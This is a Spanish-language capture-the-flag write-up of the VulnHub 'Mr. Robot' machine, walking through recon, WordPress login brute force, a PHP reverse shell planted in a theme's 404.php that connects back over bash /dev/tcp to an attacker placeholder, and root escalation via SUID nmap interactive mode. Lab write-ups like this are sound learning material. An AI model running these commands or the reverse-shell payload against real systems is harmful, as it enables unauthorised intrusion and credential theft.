

# Write-up: Mr. Robot (VulnHub) CTF

Autor: Qb1t

Fecha: 10 de Noviembre de 2025

## Resumen

La máquina propone un reto básico–intermedio con temática Mr. Robot. Tras un reconocimiento web se localiza un sitio WordPress; dentro de robots.txt aparece un diccionario que permite la fuerza bruta de credenciales. Con credenciales válidas se usa el editor de temas de WordPress para conseguir una shell inicial. La escalada final a root se realiza abusando de un binario SUID vulnerable (nmap), lo que permite obtener las tres flags del sistema.
### Fase 1: Reconocimiento y Enumeración

### 1.1. Descubrimiento de Host

El primer paso en cualquier pentest de caja negra es identificar la IP de nuestra víctima. Sabiendo que mi máquina Kali (`IP_ATACANTE`) está en la red local, utilicé `arp-scan` para encontrar todos los hosts en mi subred.

**Comando:**

```
sudo arp-scan --interface=eth0 --localnet

```

Resultado:

arp-scan reveló un host (IP_TARGET) con un OUI de VirtualBox (08:00:27:ac:d3:a7). Esta es nuestra máquina objetivo.

(Nota: La IP del objetivo (IP_TARGET) cambió varias veces durante el pentest debido a DHCP, pero la metodología sigue siendo la misma).

### 1.2. Escaneo de Puertos y Servicios

Una vez identificada la IP (`IP_TARGET`), ejecuté un escaneo `nmap` para descubrir los servicios expuestos.

**Comando:**

```
sudo nmap -sV -sC -oN nmap_initial.txt IP_TARGET
**Resultado:**
```

```
PORT      STATE  SERVICE  VERSION
22/tcp    closed ssh
80/tcp    open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp   open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=[www.example.com](<https://www.example.com>)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:AC:D3:A7 (PCS... Oracle VirtualBox)

```

**Análisis:**

- **SSH (Puerto 22):** Cerrado.
    
- HTTP (Puerto 80) y HTTPS (Puerto 443): Abiertos. Ambos corren Apache.
    
    La superficie de ataque es 100% web.
    

### Fase 2: Enumeración Web

### 2.1. Exploración Manual del Sitio Web

Al visitar `http://IP_TARGET/` en el navegador, se presenta una interfaz de terminal falsa temática de "fsociety".

### 2.2. Inspección de Archivos Estándar

Decidí buscar archivos estándar. `robots.txt` dio resultados inmediatos.

**Comando:**

```
curl http://IP_TARGET/robots.txt

```

**Resultado:**

```
User-agent: *
fsocity.dic
key-1-of-3.txt

```

**Análisis:**

- `key-1-of-3.txt`: ¡Nuestra primera bandera!
- `fsocity.dic`: Un archivo `.dic`, claramente un diccionario de contraseñas.

### 2.3. Enumeración Adicional (Nmap y WPScan)

Para encontrar más sobre la aplicación web, ejecuté un script de enumeración de `nmap`.

**Comando:**

```
nmap --script=http-enum.nse -p80 IP_TARGET

```

**Resultado (Fragmento Relevante):**

```
| http-enum:
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-login.php: Wordpress login page.

```

Análisis:

¡Es un WordPress! Y una versión muy antigua (4.3.1). Esto confirma que nuestro vector de ataque será WordPress. Procedí con wpscan para una enumeración más profunda.

**Comando:**

```
wpscan --url http://IP_TARGET/ --enumerate u --enumerate p --enumerate t

```

**Resultado (Fragmento Relevante):**

```
[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
[+] XML-RPC seems to be enabled: http://IP_TARGET/xmlrpc.php
[+] WordPress theme in use: twentyfifteen
[i] No Users Found.

```

### 2.4. Recuperación de Clave 1 y Diccionario

Procedí a descargar los archivos revelados por `robots.txt`.

**Comando:**

```
wget http://IP_TARGET/key-1-of-3.txt
wget http://IP_TARGET/fsocity.dic

```

**Resultado (Clave 1):**

```
cat key-1-of-3.txt
[CLAVE_CENSURADA]

```

**Clave 1 Obtenida:** `[CLAVE_CENSURADA]`

### Fase 3: Explotación Web (Acceso Inicial)

### 3.1. Optimización del Diccionario

El `fsocity.dic` era enorme (858,160 líneas). Decidí optimizarlo eliminando duplicados.

**Comando:**

```
sort fsocity.dic | uniq > optimized_fsocity.dic
wc -l fsocity.dic optimized_fsocity.dic

```

**Resultado:**

```
858160 fsocity.dic
 11451 optimized_fsocity.dic

```

Reducir el diccionario a 11,451 líneas hizo el ataque de fuerza bruta mucho más rápido.

### 3.2. Enumeración de Nombres de Usuario (Burp Intruder)

`wpscan` no encontró usuarios. Decidí usar Burp Intruder para encontrar un nombre de usuario válido, buscando una anomalía en la longitud de la respuesta del login (`/wp-login.php`).

**Acción:**

1. Intercepté una petición `POST` a `/wp-login.php` con credenciales falsas (`test:test`).
2. La envié a Intruder (modo `Sniper`).
3. Marqué solo el parámetro `log` (username) como posición de payload.
4. Cargué `optimized_fsocity.dic` como lista de payloads.
5. Lancé el ataque y ordené por la columna "Length".

Resultado:

Se encontró una anomalía en la longitud de la respuesta para el payload Elliot, confirmando que es un nombre de usuario válido.

### 3.3. Fuerza Bruta de Contraseña (WPScan)

Ahora que tenía un usuario (`Elliot`) y un diccionario (`optimized_fsocity.dic`), usé `wpscan` para el ataque de fuerza bruta final.

**Comando:**

```
wpscan --url http://IP_TARGET/ --usernames Elliot --passwords optimized_fsocity.dic

```

_(Nota: Las opciones en mi wpscan eran `--usernames` y `--passwords`)_.

**Resultado:**

```
[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

```

**¡Acceso obtenido!** Credenciales: `Elliot` / `ER28-0652`.

### Fase 4: Acceso al Sistema y Post-Explotación

### 4.1. Obtener una Reverse Shell (WordPress Theme Editor)

Accedí a `http://IP_TARGET/wp-admin/` con las credenciales. El plan era obtener una shell RCE editando un archivo del tema.

**Acción:**

1. **Preparar Listener (Kali):** Abrí una terminal y preparé mi `netcat` listener.
    
    ```
    nc -lvnp 4444
    
    ```
    
2. **Inyectar Payload (WordPress):**
    
    - Fui a `Appearance` > `Editor`.
    - Seleccioné el tema `twentyfifteen` y el archivo `404.php`.
    - Reemplacé todo el contenido del archivo con un payload de reverse shell en PHP:
    
    ```
    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'");
    ?>
    
    ```
    
3. **Activar Payload (Navegador):**
    
    - Visité una URL que no existe para disparar el 404: `http://IP_TARGET/pagina-falsa`

Resultado:

Recibí una conexión en mi listener de netcat.

```
Listening on 0.0.0.0 4444
Connection received on IP_ATACANTE 49756
bash: cannot set terminal process group (1518): Inappropriate ioctl for device
bash: no job control in this shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$

```

Obtuve una shell como usuario `daemon`.

### 4.2. Enumeración Local: Credenciales y SUID

Inmediatamente busqué archivos de configuración y vectores de escalada.

Acción: cat wp-config.php

Encontré credenciales de la base de datos y de un usuario FTP.

**Resultado (`wp-config.php`):**

```
define('DB_USER', 'bn_wordpress');
define('DB_PASSWORD', '570fd42948');

define('FTP_USER', 'bitnamiftp');
define('FTP_PASS', 'inevoL7eAlBeD2b5WszPbZ2gJ971tJZtP0j86NYPyh6Wfz1x8a');

```

Acción: Búsqueda de SUID

Busqué binarios SUID como un vector de escalada.

**Comando:**

```
find / -perm -u=s -type f 2>/dev/null

```

**Resultado (Fragmento Relevante):**

```
/usr/local/bin/nmap
... (otros binarios estándar) ...

```

**Análisis:** ¡`nmap` está configurado con SUID! Esta es una vulnerabilidad de escalada de privilegios muy conocida.

### Fase 5: Escalada de Privilegios y Captura de Banderas

### 5.1. Escalada de Privilegios (Nmap SUID Exploit)

El usuario `daemon` no tiene `nmap` en su PATH, así que tuve que usar la ruta completa.

**Comando:**

```
/usr/local/bin/nmap --interactive

```

**Resultado:**

```
Starting nmap V. 3.81 ( <http://www.insecure.org/nmap/> )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root

```

**¡Éxito!** Al ejecutar `!sh` dentro del modo interactivo de `nmap`, obtuve una shell como `root`.

### 5.2. Captura de Claves (key-2 y key-3)

Ahora, como `root`, procedí a buscar las claves restantes.

**Acción: Encontrando Key 2**

```
cd /home/robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt

```

Resultado (Clave 2):

[CLAVE_CENSURADA]

(También se encontró un hash MD5 para el usuario robot en password.raw-md5).

**Acción: Encontrando Key 3**

```
cd /root
ls
key-3-of-3.txt
firstboot_done
cat key-3-of-3.txt

```

Resultado (Clave 3):

[CLAVE_CENSURADA]

### Conclusión

Las tres claves han sido capturadas. El compromiso total de la máquina se logró mediante la explotación de un WordPress desactualizado (lo que permitió la fuerza bruta) y una escalada de privilegios a través de un binario SUID mal configurado (`nmap`).

Este CTF demuestra un ciclo de pentesting realista: reconocimiento web, enumeración de CMS, explotación de credenciales y escalada de privilegios local.
